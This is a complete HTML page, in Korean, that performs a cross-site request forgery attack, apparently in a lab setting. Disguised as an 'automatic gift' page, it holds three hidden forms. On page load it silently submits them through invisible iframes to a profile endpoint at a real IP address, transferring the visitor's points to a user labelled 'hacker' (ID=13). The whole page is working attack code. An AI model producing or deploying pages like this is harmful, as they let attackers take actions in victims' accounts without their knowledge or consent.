<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>🎁 자동 선물 보내기</title>
    <style>
        body { 
            font-family: Arial; 
            padding: 30px;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            color: white;
            text-align: center;
        }
        .gift-container {
            background: rgba(0, 0, 0, 0.8);
            border: 3px solid #ffd700;
            padding: 40px;
            margin: 20px auto;
            border-radius: 20px;
            max-width: 600px;
            box-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
        }
        .status {
            background: rgba(255, 255, 255, 0.1);
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
            font-size: 18px;
        }
        .success { background: rgba(40, 167, 69, 0.3); }
        .loading { background: rgba(255, 193, 7, 0.3); }
        iframe { display: none !important; }
    </style>
</head>
<body>
    <div class="gift-container">
        <h1>🎁 자동 선물 보내기</h1>
        <h2>🎯 ID=13 (hacker)에게 포인트 전송 중...</h2>
        
        <div id="status" class="status loading">
            ⏳ 준비 중...
        </div>
        
        <div id="progress"></div>
    </div>

    <!-- 실제 CSRF 공격 폼들 -->
    <form id="form1" action="http://3.36.66.216/profile.php" method="POST" target="frame1" style="display:none;">
        <input type="hidden" name="gift_type" value="coffee">
        <input type="hidden" name="points" value="100">
        <input type="hidden" name="message" value="생일축하해!">
        <input type="hidden" name="gift_to" value="13">
    </form>

    <form id="form2" action="http://3.36.66.216/profile.php" method="POST" target="frame2" style="display:none;">
        <input type="hidden" name="gift_type" value="flower">
        <input type="hidden" name="points" value="150">
        <input type="hidden" name="message" value="선물이야~">
        <input type="hidden" name="gift_to" value="13">
    </form>

    <form id="form3" action="http://3.36.66.216/profile.php" method="POST" target="frame3" style="display:none;">
        <input type="hidden" name="gift_type" value="cake">
        <input type="hidden" name="points" value="200">
        <input type="hidden" name="message" value="맛있게먹어">
        <input type="hidden" name="gift_to" value="13">
    </form>

    <iframe name="frame1" style="display:none;"></iframe>
    <iframe name="frame2" style="display:none;"></iframe>
    <iframe name="frame3" style="display:none;"></iframe>

    <script>
        let attackCount = 0;
        let totalAttacks = 3;

        function updateStatus(message, isSuccess = false) {
            const statusDiv = document.getElementById('status');
            statusDiv.innerHTML = message;
            statusDiv.className = isSuccess ? 'status success' : 'status loading';
        }

        function updateProgress() {
            document.getElementById('progress').innerHTML = `
                <div class="status">
                    📊 진행상황: ${attackCount}/${totalAttacks} 완료<br>
                    💰 전송 완료: ${attackCount}개 폼 제출
                </div>
            `;
        }

        function executeAttack(formId, delay, attackName) {
            setTimeout(() => {
                document.getElementById(formId).submit();
                attackCount++;
                
                updateStatus(`🚀 ${attackName} 전송 완료!`);
                updateProgress();
                
                console.log(`[CSRF] ${attackName} 폼 제출 완료`);
                
                if (attackCount === totalAttacks) {
                    setTimeout(() => {
                        updateStatus(`
                            🎉 모든 공격 완료!<br>
                            🎯 hacker(ID=13)에게 선물 전송 완료<br>
                            🔍 모니터링 대시보드에서 확인하세요!
                        `, true);
                    }, 1000);
                }
            }, delay);
        }

        // 페이지 로드 후 자동 실행
        window.addEventListener('load', function() {
            updateStatus('🔄 CSRF 공격 시작...');
            
            // 3개 공격을 순차 실행
            executeAttack('form1', 1000, '커피 선물 (100P)');
            executeAttack('form2', 3000, '꽃 선물 (150P)');  
            executeAttack('form3', 5000, '케이크 선물 (200P)');
            
            console.log('🔥 CSRF 공격 시작됨');
        });
    </script>
</body>
</html>
